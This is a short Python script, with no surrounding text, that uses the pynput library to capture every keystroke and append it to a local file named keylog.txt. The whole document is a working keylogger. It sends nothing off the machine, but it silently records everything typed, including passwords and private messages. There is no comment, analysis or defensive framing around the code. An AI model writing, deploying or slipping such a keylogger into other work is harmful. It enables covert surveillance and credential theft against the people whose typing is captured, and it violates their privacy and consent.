from pynput.keyboard import Listener

log_file = "keylog.txt"

def log_keystroke(key):
    try:
        letter = key.char
    except:
        letter = str(key)

    with open(log_file, "a") as file:
        file.write(letter + " ")

with Listener(on_press=log_keystroke) as listener:
    listener.join()
